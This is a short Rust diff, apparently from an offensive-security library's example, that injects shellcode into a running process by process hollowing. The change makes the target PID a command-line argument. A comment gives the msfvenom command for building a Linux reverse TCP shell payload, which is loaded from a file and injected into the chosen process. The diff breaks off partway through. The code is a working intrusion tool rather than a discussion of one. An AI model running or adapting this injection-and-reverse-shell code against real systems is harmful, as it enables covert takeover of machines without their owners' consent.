@@ -1,4 +1,4 @@
-use std::env::current_dir;
+use std::env::{args, current_dir};
 
 use linc::payload::{Existing, Payload, PayloadType};
 use linc::techniques::inject::hollow;
@@ -6,13 +6,18 @@ use linc::techniques::inject::hollow;
 fn main() {
     let path = current_dir().unwrap();
     let cwd = path.display();
+    let pid: i32 = args()
+        .nth(1)
+        .expect("PID argument required")
+        .parse()
+        .expect("PID must be a number");
 
     // Shellcode:
     // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
     let shellcode = format!("{}/assets/shellcode.bin", cwd);
 
     // Change target PID
-    let payload = Payload::<Existing>::from_file(&shellcode, PayloadType::Shellcode, 37760);
+    let payload = Payload::<Existing>::from_file(&shellcode, PayloadType::Shellcode, pid);
 
     let payload = match payload {
         Ok(p) => p,
